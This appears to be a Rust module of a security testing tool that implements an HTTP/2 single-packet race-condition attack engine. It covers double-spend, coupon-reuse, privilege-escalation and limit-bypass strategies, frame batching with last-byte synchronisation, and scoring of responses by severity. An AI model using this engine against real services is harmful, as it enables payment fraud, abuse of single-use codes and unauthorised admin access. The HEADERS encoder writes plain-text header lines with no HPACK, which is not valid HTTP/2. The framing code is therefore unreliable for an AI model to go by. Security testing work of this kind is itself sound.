use std::collections::HashMap;
use std::time::Duration;

/// Attack strategy for the single-packet race condition exploit.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, serde::Serialize, serde::Deserialize)]
pub enum RaceStrategy {
    /// Double-spend: send identical payment/transfer requests simultaneously
    DoubleSpend,
    /// Coupon reuse: apply the same single-use code in parallel
    CouponReuse,
    /// Privilege escalation: concurrent role assignment requests
    PrivilegeEscalation,
    /// TOCTOU: exploit time-of-check vs time-of-use gaps
    Toctou,
    /// Limit bypass: exceed rate limits or quotas via simultaneous requests
    LimitBypass,
    /// Session overlap: create conflicting session states
    SessionOverlap,
}

impl std::fmt::Display for RaceStrategy {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::DoubleSpend => write!(f, "double_spend"),
            Self::CouponReuse => write!(f, "coupon_reuse"),
            Self::PrivilegeEscalation => write!(f, "privilege_escalation"),
            Self::Toctou => write!(f, "toctou"),
            Self::LimitBypass => write!(f, "limit_bypass"),
            Self::SessionOverlap => write!(f, "session_overlap"),
        }
    }
}

impl RaceStrategy {
    pub fn all() -> &'static [RaceStrategy] {
        &[
            RaceStrategy::DoubleSpend,
            RaceStrategy::CouponReuse,
            RaceStrategy::PrivilegeEscalation,
            RaceStrategy::Toctou,
            RaceStrategy::LimitBypass,
            RaceStrategy::SessionOverlap,
        ]
    }
}

/// HTTP method for race requests.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, serde::Serialize, serde::Deserialize)]
pub enum HttpMethod {
    Get,
    Post,
    Put,
    Patch,
    Delete,
}

impl std::fmt::Display for HttpMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Get => write!(f, "GET"),
            Self::Post => write!(f, "POST"),
            Self::Put => write!(f, "PUT"),
            Self::Patch => write!(f, "PATCH"),
            Self::Delete => write!(f, "DELETE"),
        }
    }
}

/// A single request in a race batch, ready to be sent in one TCP frame.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct RaceRequest {
    pub id: String,
    pub method: HttpMethod,
    pub url: String,
    pub headers: HashMap<String, String>,
    pub body: Option<String>,
    pub label: String,
}

/// Result of a single request within the race batch.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct RaceResponse {
    pub request_id: String,
    pub status_code: u16,
    pub headers: HashMap<String, String>,
    pub body: String,
    pub elapsed_ms: u64,
    pub h2_stream_id: u32,
}

/// Outcome classification for a race attempt.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, serde::Serialize, serde::Deserialize)]
pub enum RaceOutcome {
    /// Race condition confirmed — multiple requests succeeded when only one should
    Confirmed,
    /// Partial success — some but not all racing requests succeeded unexpectedly
    Partial,
    /// Server appears to handle concurrency correctly
    Mitigated,
    /// Indeterminate — responses don't clearly indicate success or failure
    Indeterminate,
    /// Error during the race attempt
    Error,
}

impl std::fmt::Display for RaceOutcome {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Confirmed => write!(f, "CONFIRMED"),
            Self::Partial => write!(f, "PARTIAL"),
            Self::Mitigated => write!(f, "MITIGATED"),
            Self::Indeterminate => write!(f, "INDETERMINATE"),
            Self::Error => write!(f, "ERROR"),
        }
    }
}

/// Detection criteria for determining if a race succeeded.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct SuccessDetector {
    pub expected_success_status: Vec<u16>,
    pub success_body_contains: Vec<String>,
    pub failure_body_contains: Vec<String>,
    pub max_expected_successes: usize,
}

impl Default for SuccessDetector {
    fn default() -> Self {
        Self {
            expected_success_status: vec![200, 201, 202],
            success_body_contains: vec![],
            failure_body_contains: vec![
                "error".to_string(),
                "failed".to_string(),
                "denied".to_string(),
            ],
            max_expected_successes: 1,
        }
    }
}

/// Configuration for a single-packet race attack.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct RaceConfig {
    pub num_requests: usize,
    pub strategy: RaceStrategy,
    pub target_endpoints: Vec<String>,
    pub detector: SuccessDetector,
    pub warmup_requests: usize,
    pub retry_attempts: usize,
    pub connection_timeout_ms: u64,
    pub gate_timeout_ms: u64,
    pub vary_last_byte: bool,
}

impl Default for RaceConfig {
    fn default() -> Self {
        Self {
            num_requests: 20,
            strategy: RaceStrategy::DoubleSpend,
            target_endpoints: vec![],
            detector: SuccessDetector::default(),
            warmup_requests: 5,
            retry_attempts: 3,
            connection_timeout_ms: 5000,
            gate_timeout_ms: 100,
            vary_last_byte: true,
        }
    }
}

/// Frame batch representing N HTTP/2 requests packed into minimal TCP frames.
#[derive(Debug, Clone)]
pub struct H2FrameBatch {
    pub stream_ids: Vec<u32>,
    pub headers_frames: Vec<Vec<u8>>,
    pub data_frames: Vec<Vec<u8>>,
    pub total_bytes: usize,
    pub request_count: usize,
}

/// Timing data from a race execution.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct RaceTimings {
    pub connection_established_ms: u64,
    pub warmup_completed_ms: u64,
    pub batch_sent_ms: u64,
    pub first_response_ms: u64,
    pub last_response_ms: u64,
    pub jitter_ms: u64,
    pub total_ms: u64,
}

/// Full result of a single-packet race attack.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct RaceResult {
    pub config: RaceConfig,
    pub outcome: RaceOutcome,
    pub responses: Vec<RaceResponse>,
    pub successful_count: usize,
    pub failed_count: usize,
    pub timings: RaceTimings,
    pub description: String,
    pub evidence: String,
    pub severity: RaceSeverity,
}

/// Severity of a confirmed race condition.
#[derive(
    Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, serde::Serialize, serde::Deserialize,
)]
pub enum RaceSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl std::fmt::Display for RaceSeverity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Info => write!(f, "info"),
            Self::Low => write!(f, "low"),
            Self::Medium => write!(f, "medium"),
            Self::High => write!(f, "high"),
            Self::Critical => write!(f, "critical"),
        }
    }
}

/// H2 connection preface as required by RFC 7540.
pub const H2_CONNECTION_PREFACE: &[u8] = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

/// Single-packet race condition engine using HTTP/2 multiplexing.
/// Sends N requests in a single TCP frame to eliminate network jitter,
/// maximizing the probability of triggering race conditions.
pub struct SinglePacketRaceEngine {
    config: RaceConfig,
}

impl Default for SinglePacketRaceEngine {
    fn default() -> Self {
        Self::new(RaceConfig::default())
    }
}

impl SinglePacketRaceEngine {
    pub fn new(config: RaceConfig) -> Self {
        Self { config }
    }

    /// Build an H2 frame batch with all requests packed for single-packet delivery.
    /// Uses the "last-byte sync" technique: send all headers + N-1 bytes of each body,
    /// then a final frame with all the last bytes to trigger simultaneous processing.
    pub fn build_frame_batch(&self, requests: &[RaceRequest]) -> H2FrameBatch {
        let mut stream_ids = Vec::new();
        let mut headers_frames = Vec::new();
        let mut data_frames = Vec::new();
        let mut total_bytes = 0;

        for (i, req) in requests.iter().enumerate() {
            let stream_id = (i as u32 * 2) + 1;
            stream_ids.push(stream_id);

            let headers_frame = encode_h2_headers(stream_id, req);
            total_bytes += headers_frame.len();
            headers_frames.push(headers_frame);

            if let Some(body) = &req.body {
                let data_frame =
                    encode_h2_data(stream_id, body.as_bytes(), !self.config.vary_last_byte);
                total_bytes += data_frame.len();
                data_frames.push(data_frame);
            } else {
                data_frames.push(Vec::new());
            }
        }

        H2FrameBatch {
            stream_ids,
            headers_frames,
            data_frames,
            total_bytes,
            request_count: requests.len(),
        }
    }

    /// Build the final "gate release" frame — the last byte of each request body.
    /// When vary_last_byte is enabled, this triggers all requests to complete simultaneously.
    pub fn build_gate_release(&self, requests: &[RaceRequest]) -> Vec<u8> {
        let mut gate_frame = Vec::new();
        for (i, req) in requests.iter().enumerate() {
            let stream_id = (i as u32 * 2) + 1;
            if let Some(body) = &req.body {
                if self.config.vary_last_byte && !body.is_empty() {
                    let last_byte = &body.as_bytes()[body.len() - 1..];
                    let mut frame = encode_h2_data(stream_id, last_byte, true);
                    gate_frame.append(&mut frame);
                }
            }
        }
        gate_frame
    }

    /// Generate race requests for the configured strategy.
    pub fn generate_requests(&self) -> Vec<RaceRequest> {
        let mut requests = Vec::new();
        let template_url = self
            .config
            .target_endpoints
            .first()
            .cloned()
            .unwrap_or_else(|| "http://localhost:8080/api/action".to_string());

        for i in 0..self.config.num_requests {
            let (method, body, label) = match self.config.strategy {
                RaceStrategy::DoubleSpend => (
                    HttpMethod::Post,
                    Some(format!(
                        r#"{{"amount":100,"to":"attacker","nonce":"{}"}}"#,
                        i
                    )),
                    format!("double-spend-{}", i),
                ),
                RaceStrategy::CouponReuse => (
                    HttpMethod::Post,
                    Some(r#"{"coupon":"SAVE50","cart_id":"abc123"}"#.to_string()),
                    format!("coupon-reuse-{}", i),
                ),
                RaceStrategy::PrivilegeEscalation => (
                    HttpMethod::Put,
                    Some(r#"{"role":"admin","user_id":"target-user"}"#.to_string()),
                    format!("priv-esc-{}", i),
                ),
                RaceStrategy::Toctou => (
                    HttpMethod::Post,
                    Some(format!(
                        r#"{{"action":"withdraw","amount":1000,"request_id":"{}"}}"#,
                        i
                    )),
                    format!("toctou-{}", i),
                ),
                RaceStrategy::LimitBypass => (
                    HttpMethod::Post,
                    Some(r#"{"action":"claim_reward"}"#.to_string()),
                    format!("limit-bypass-{}", i),
                ),
                RaceStrategy::SessionOverlap => (
                    HttpMethod::Post,
                    Some(format!(r#"{{"session":"sess_{}","action":"login"}}"#, i)),
                    format!("session-overlap-{}", i),
                ),
            };

            let mut headers = HashMap::new();
            headers.insert("content-type".to_string(), "application/json".to_string());
            headers.insert("x-race-id".to_string(), format!("race-{}", i));

            requests.push(RaceRequest {
                id: format!("req-{}", i),
                method,
                url: template_url.clone(),
                headers,
                body,
                label,
            });
        }
        requests
    }

    /// Generate warmup requests for connection priming.
    pub fn generate_warmup_requests(&self) -> Vec<RaceRequest> {
        let template_url = self
            .config
            .target_endpoints
            .first()
            .cloned()
            .unwrap_or_else(|| "http://localhost:8080/".to_string());

        (0..self.config.warmup_requests)
            .map(|i| RaceRequest {
                id: format!("warmup-{}", i),
                method: HttpMethod::Get,
                url: template_url.clone(),
                headers: HashMap::new(),
                body: None,
                label: format!("warmup-{}", i),
            })
            .collect()
    }

    /// Analyze responses to determine the race outcome.
    pub fn analyze_responses(&self, responses: &[RaceResponse]) -> RaceResult {
        let detector = &self.config.detector;

        let mut successful = 0;
        let mut failed = 0;

        for resp in responses {
            let status_ok = detector.expected_success_status.contains(&resp.status_code);
            let body_has_success = detector.success_body_contains.is_empty()
                || detector
                    .success_body_contains
                    .iter()
                    .any(|s| resp.body.to_lowercase().contains(&s.to_lowercase()));
            let body_has_failure = detector
                .failure_body_contains
                .iter()
                .any(|s| resp.body.to_lowercase().contains(&s.to_lowercase()));

            if status_ok && body_has_success && !body_has_failure {
                successful += 1;
            } else {
                failed += 1;
            }
        }

        let outcome = if successful > detector.max_expected_successes {
            RaceOutcome::Confirmed
        } else if successful > 0 && successful == detector.max_expected_successes {
            RaceOutcome::Mitigated
        } else if successful > 0 {
            RaceOutcome::Partial
        } else if responses.is_empty() {
            RaceOutcome::Error
        } else {
            RaceOutcome::Indeterminate
        };

        let severity = self.compute_severity(&outcome);

        let timings = compute_timings(responses);
        let evidence = self.build_evidence(responses, successful, &outcome);
        let description = format!(
            "HTTP/2 single-packet race ({}) — {} of {} requests succeeded (expected max: {})",
            self.config.strategy,
            successful,
            responses.len(),
            detector.max_expected_successes,
        );

        RaceResult {
            config: self.config.clone(),
            outcome,
            responses: responses.to_vec(),
            successful_count: successful,
            failed_count: failed,
            timings,
            description,
            evidence,
            severity,
        }
    }

    /// Compute the connection timeout as Duration.
    pub fn connection_timeout(&self) -> Duration {
        Duration::from_millis(self.config.connection_timeout_ms)
    }

    /// Return the configured retry count.
    pub fn retry_attempts(&self) -> usize {
        self.config.retry_attempts
    }

    fn compute_severity(&self, outcome: &RaceOutcome) -> RaceSeverity {
        match outcome {
            RaceOutcome::Confirmed => match self.config.strategy {
                RaceStrategy::DoubleSpend | RaceStrategy::PrivilegeEscalation => {
                    RaceSeverity::Critical
                }
                RaceStrategy::CouponReuse | RaceStrategy::Toctou => RaceSeverity::High,
                RaceStrategy::LimitBypass => RaceSeverity::Medium,
                RaceStrategy::SessionOverlap => RaceSeverity::Medium,
            },
            RaceOutcome::Partial => RaceSeverity::Medium,
            RaceOutcome::Mitigated => RaceSeverity::Info,
            RaceOutcome::Indeterminate => RaceSeverity::Low,
            RaceOutcome::Error => RaceSeverity::Info,
        }
    }

    fn build_evidence(
        &self,
        responses: &[RaceResponse],
        successful: usize,
        outcome: &RaceOutcome,
    ) -> String {
        let mut evidence = format!(
            "Strategy: {}\nOutcome: {}\nSuccessful: {}/{}\n",
            self.config.strategy,
            outcome,
            successful,
            responses.len(),
        );

        if !responses.is_empty() {
            let min_elapsed = responses.iter().map(|r| r.elapsed_ms).min().unwrap_or(0);
            let max_elapsed = responses.iter().map(|r| r.elapsed_ms).max().unwrap_or(0);
            evidence.push_str(&format!(
                "Response time spread: {}ms - {}ms (jitter: {}ms)\n",
                min_elapsed,
                max_elapsed,
                max_elapsed.saturating_sub(min_elapsed),
            ));

            let status_dist: HashMap<u16, usize> =
                responses.iter().fold(HashMap::new(), |mut acc, r| {
                    *acc.entry(r.status_code).or_insert(0) += 1;
                    acc
                });
            evidence.push_str("Status distribution: ");
            for (status, count) in &status_dist {
                evidence.push_str(&format!("{}x{} ", status, count));
            }
            evidence.push('\n');
        }

        evidence
    }
}

/// Encode an HTTP/2 HEADERS frame (simplified — no HPACK, uses literal encoding).
fn encode_h2_headers(stream_id: u32, request: &RaceRequest) -> Vec<u8> {
    let mut pseudo_headers = Vec::new();
    pseudo_headers.push(format!(":method = {}", request.method));
    pseudo_headers.push(format!(":path = {}", extract_path(&request.url)));
    pseudo_headers.push(format!(":scheme = {}", extract_scheme(&request.url)));
    pseudo_headers.push(format!(":authority = {}", extract_authority(&request.url)));

    for (key, value) in &request.headers {
        pseudo_headers.push(format!("{} = {}", key, value));
    }

    let header_block: Vec<u8> = pseudo_headers.join("\r\n").into_bytes();
    let end_stream = request.body.is_none();

    let mut frame = Vec::with_capacity(9 + header_block.len());
    let length = header_block.len() as u32;
    frame.push((length >> 16) as u8);
    frame.push((length >> 8) as u8);
    frame.push(length as u8);
    frame.push(0x01); // HEADERS frame type
    let mut flags = 0x04; // END_HEADERS
    if end_stream {
        flags |= 0x01; // END_STREAM
    }
    frame.push(flags);
    frame.push((stream_id >> 24) as u8);
    frame.push((stream_id >> 16) as u8);
    frame.push((stream_id >> 8) as u8);
    frame.push(stream_id as u8);
    frame.extend_from_slice(&header_block);

    frame
}

/// Encode an HTTP/2 DATA frame.
fn encode_h2_data(stream_id: u32, data: &[u8], end_stream: bool) -> Vec<u8> {
    let mut frame = Vec::with_capacity(9 + data.len());
    let length = data.len() as u32;
    frame.push((length >> 16) as u8);
    frame.push((length >> 8) as u8);
    frame.push(length as u8);
    frame.push(0x00); // DATA frame type
    frame.push(if end_stream { 0x01 } else { 0x00 });
    frame.push((stream_id >> 24) as u8);
    frame.push((stream_id >> 16) as u8);
    frame.push((stream_id >> 8) as u8);
    frame.push(stream_id as u8);
    frame.extend_from_slice(data);

    frame
}

fn extract_path(url: &str) -> String {
    if let Some(pos) = url.find("://") {
        let after_scheme = &url[pos + 3..];
        if let Some(slash) = after_scheme.find('/') {
            return after_scheme[slash..].to_string();
        }
    }
    "/".to_string()
}

fn extract_scheme(url: &str) -> String {
    if url.starts_with("https") {
        "https".to_string()
    } else {
        "http".to_string()
    }
}

fn extract_authority(url: &str) -> String {
    if let Some(pos) = url.find("://") {
        let after_scheme = &url[pos + 3..];
        if let Some(slash) = after_scheme.find('/') {
            return after_scheme[..slash].to_string();
        }
        return after_scheme.to_string();
    }
    "localhost".to_string()
}

fn compute_timings(responses: &[RaceResponse]) -> RaceTimings {
    let first = responses.iter().map(|r| r.elapsed_ms).min().unwrap_or(0);
    let last = responses.iter().map(|r| r.elapsed_ms).max().unwrap_or(0);
    let jitter = last.saturating_sub(first);

    RaceTimings {
        connection_established_ms: 0,
        warmup_completed_ms: 0,
        batch_sent_ms: 0,
        first_response_ms: first,
        last_response_ms: last,
        jitter_ms: jitter,
        total_ms: last,
    }
}
